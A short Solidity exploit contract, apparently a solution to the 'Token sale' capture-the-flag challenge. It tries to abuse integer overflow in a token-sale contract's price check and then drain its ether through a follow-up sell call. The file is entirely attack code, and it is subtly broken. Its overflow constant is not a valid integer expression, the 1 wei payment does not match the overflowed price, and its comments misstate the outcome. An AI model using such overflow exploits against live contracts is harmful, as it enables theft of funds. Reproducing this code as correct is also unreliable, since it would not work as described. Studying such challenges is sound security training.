pragma solidity ^0.4.21;

interface ITokenSaleChallenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function isComplete() external view returns (bool);
}

contract ExploitTokenSale {
    ITokenSaleChallenge public target;

    constructor(address _target) public {
        target = ITokenSaleChallenge(_target);
    }

    function attack() external payable {
        require(msg.value == 1 ether);

        // Compute overflow-inducing numTokens
        uint256 overflowNumTokens = (2**256 / 1 ether) + 1;

        // Overflow occurs in `buy`, paying only 1 wei for massive tokens
        target.buy.value(1 wei)(overflowNumTokens);

        // Sell a small amount to drain contract's ether
        target.sell(1);

        // Profit: user gets 1 ether - 1 wei in return
    }

    function () public payable {}  // accept ETH
}

